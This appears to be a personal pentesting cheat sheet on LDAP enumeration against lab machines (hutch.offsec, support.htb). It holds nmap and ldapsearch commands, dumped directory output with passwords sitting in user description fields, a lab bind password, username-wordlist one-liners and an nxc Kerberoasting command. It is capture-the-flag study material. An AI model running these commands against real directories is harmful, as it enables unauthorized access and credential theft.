
## Enumerating LDAP Domain

```
nmap -n -Pn -sV --script "ldap* and not brute" 192.168.155.122
```

# Apache Directory Studio (Authenticated)

Prefered version, takes more time but is more efficient.

Can be downloaded from **here**: https://directory.apache.org/studio/download/download-linux.html

```
./ApacheDirectoryStudio
```

1. Upon accessing it press on the button on the top-left.
2. Press right click in the "Connections" Tab and choose "New Connection"

Input Support as the connection name, support.htb as the hostname and click Next .

![[Pasted image 20260608225344.png]]

Input the previously retrieved credentials.

![[Pasted image 20260608225420.png]]

We can now view all the objects properly.

![[Pasted image 20260608225627.png]]

And found an "info" panel with an password!
## LDAP User Enumeration

```
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.155.122" "(objectclass=*)"
ldap_initialize( ldap://192.168.155.122:389/??base )
# Freddy McSorley, Users, hutch.offsec
dn: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Freddy McSorley
description: Password set to CrabSharkJellyfish192 at user's request. Please c
 hange on next login.
distinguishedName: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20210216133934.0Z
uSNCreated: 12831
uSNChanged: 49179
name: Freddy McSorley
objectGUID:: TxilGIhMVkuei6KplCd8ug==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132489437036308102
lastLogoff: 0
lastLogon: 132579563744834908
pwdLastSet: 132489417058152751
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWwQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: fmcsorley
sAMAccountType: 805306368
userPrincipalName: fmcsorley@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 132579563744834908
msDS-SupportedEncryptionTypes: 0

# search result
search: 2
result: 0 Success

# numResponses: 42
# numEntries: 38
# numReferences: 3
```

```
ldapsearch -x -H ldap://10.10.161.74 -b "dc=thm,dc=local" > ldapsearch.txt
```

```
cat ldapsearch.txt | grep description
cat ldapsearch.txt | grep info
```

Enumerate users

```
cat ldapsearch.txt | grep dn
```

Save output in wordlist "users.txt"

lkeim format

```
grep -E 'CN=[A-Z][a-z]+ [A-Z][a-z]+' ldapsearch.txt | awk -F',|=' '{print $2}' | awk '{print tolower(substr($1,1,1)) tolower($2)}' | sort -u > users.txt
```

Firstname.Lastname

```
grep -E 'CN=[A-Z][a-z]+ [A-Z][a-z]+' ldapsearch.txt | awk -F',|=' '{print $2}' | awk '{print tolower($1) "." tolower($2)}' | sort -u > users.txt
```
## Authenticated ldapsearch

```
ldapsearch -H "ldap://support.htb" -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "*" > ldapsearch.txt
```
## Kerberoasting using nxc

```
nxc ldap thm.local -u 'guest' -p '' --kerberoasting kerberoastables.txt
```

